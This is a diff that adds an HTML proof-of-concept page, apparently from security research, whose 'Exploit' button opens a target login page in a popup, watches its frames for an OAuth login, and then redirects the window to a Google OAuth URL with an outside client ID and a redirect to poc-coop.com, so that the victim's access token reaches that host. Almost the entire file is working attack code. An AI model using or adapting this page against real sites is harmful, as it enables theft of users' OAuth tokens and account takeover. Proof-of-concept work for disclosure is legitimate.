@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f2f2f2;
+        }
+        img {
+            width: 400px;
+            height: 500px;
+            object-fit: contain;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+<script>
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    let foo;
+    let initialFrames = 0;
+    var urlParam = getParameterByName('url');
+    let attackOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth?client_id=50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com&redirect_uri=https://poc-coop.com/store.html&response_type=token&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile";
+
+    function init() {
+        try {
+            initialFrames = foo.frames.length; // Get initial frame count
+            console.log("Initial Frame Count: " + initialFrames);
+            monitorFrames();
+        } catch (e) {
+            console.log("Error accessing frame count.");
+        }
+    }
+
+    function monitorFrames() {
+        if (!foo || foo.closed) {
+            console.log("Login window closed, stopping attack.");
+            return;
+        }
+
+        try {
+            let currentFrames = foo.frames.length;
+
+            if (currentFrames > initialFrames) {
+                console.log("OAuth login detected! Redirecting...");
+                foo.location.replace(attackOAuthURL);
+                return;
+            }
+        } catch (e) {
+            console.log("Monitoring frames...");
+        }
+
+        setTimeout(monitorFrames, 1000); // Keep monitoring every second
+    }
+
+    function launch() {
+        foo = window.open(urlParam, "foo", "");
+        setTimeout(init, 2000); // Start monitoring after 2 seconds
+    }
+</script>
+</head>
+<body>
+    <script src="/main.js"></script>
+    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif">
+    </br>
+    <button onclick="launch()">Exploit</button>
+</body>
+</html>
